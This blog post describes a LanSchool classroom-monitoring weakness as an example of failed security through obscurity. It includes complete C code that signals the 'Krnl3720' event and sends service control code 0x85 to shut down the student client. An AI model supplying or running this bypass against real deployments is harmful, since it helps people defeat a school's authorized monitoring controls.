---
layout: post
title: Killing LanSchool Ethically
tags: lanschool kill vulnerability
description: Security through obscurity has its downfalls.
custom_css: syntax
---
Disclaimer
---------
The information in this article is to be used and is provided for educational 
purposes only, namely demonstrating the caveats of technological security practices that solely 
rely on security through obscurity to achieve a false sense of security. The author 
is not liable and may not be held responsible in any circumstance for 
any death, injury, security breach, or thermonuclear war caused as a 
direct or indirect effect of providing the information in this article. By continuing to read 
this article, you agree to these terms and conditions. If you do not 
agree to these terms and conditions, do not continue reading.

All information in this article was researched and procured via the 
official LanSchool documentation available on their website. Demo binaries 
were obtained for the disassemblies.

Introduction
---------
LanSchool is a classroom management solution used to monitor student learning 
and improve learning in a digital classroom. It features a screen monitor, 
keystroke monitor, teacher-to-student chat feature, and URL monitor.

Since this allows teachers to monitor student activity and lock down 
computers, it proves unpopular with students under its reign, leading 
many students to find tricks to circumvent the program through its many 
bugs and shortcomings. These get patched eventually though. For a piece 
of software used in institutions where data security is of utmost 
importance, it was not designed with nearly enough security in mind, 
allowing students to impersonate teachers, steal key logs, assume 
authority roles etc. However, this is not the purpose of my article. 
The purpose instead, is to highlight the flaws in the "security through 
obscurity" model with a tangible example. In this case, the effects 
of the vulnerability are not massive, but the same issue in other 
implementations could be deadly.

The Vulnerability
---------
LanSchool is composed of two pieces of software, LanSchool Student and 
LanSchool Teacher, one which runs on student computers, and one which 
runs on teacher computers. While LanSchool Student is running, you cannot 
launch LanSchool Teacher, as LS Teacher checks for the existence of LS Student 
before launching. This prevents students from impersonating teachers by running 
the LS Teacher binary (which is installed along with LS Student in most boards). 
However, LanSchool Student does have a built-in hook that kills itself when called, 
so that teachers can switch from a student terminal to a teacher terminal. After 
LS Student is killed, teachers can launch the LS Teacher binary to govern their class. 

Below is a quick disassembly visualization of a LanSchool binary:

![alt text](https://i.imgur.com/IW5Qbpo.png)

Indicated above are instructions that call the Windows API to trigger 
a Windows Event. In this case, it triggers an event called _Krnl3720_. 
The LS Student binary listens for this event to happen, and when it does, 
it shuts down gracefully.

Below is a C program that simulates the behavior of this LanSchool binary:

``` c++
#include <windows.h>

int main()
{
    // Send the LanSchool Student Service a user code of 0x85
    // When the service receives this code, it ends the service,
    // preventing LS Student from starting itself after it is killed
    
	SC_HANDLE scMgrHndl = OpenSCManagerA(NULL, NULL, 1);
	SC_HANDLE svcHndl = OpenServiceA(scMgrHndl, "LanSchoolStudent", 0x100);
	CloseServiceHandle(scMgrHndl);
	SERVICE_STATUS svcStatus;
	ControlService(svcHndl, 0x85, &svcStatus);
	CloseServiceHandle(svcHndl);

    // Trigger the 'Krnl3720' Windows Event, which the LS Student
    // binary will listen for, and shut itself down when triggered
    
	HANDLE eventHndl = OpenEventA(2, TRUE, "Global\\Krnl3720");
	SetEvent(eventHndl);
	Sleep(0x7D0);
	ResetEvent(eventHndl);
	CloseHandle(eventHndl);
	return 0;
}
```

Conclusion
------------
We have now achieved our goal of killing LS Student gracefully, using the same 
methods as the official binaries. The security of this system relies solely 
on the assumption that attackers will not discover the existence of the 
_Krnl3720_ event hook. You know what, I'm too tired to write the rest of this 
so <del>have fun</del> be responsible with whatever I've written here.




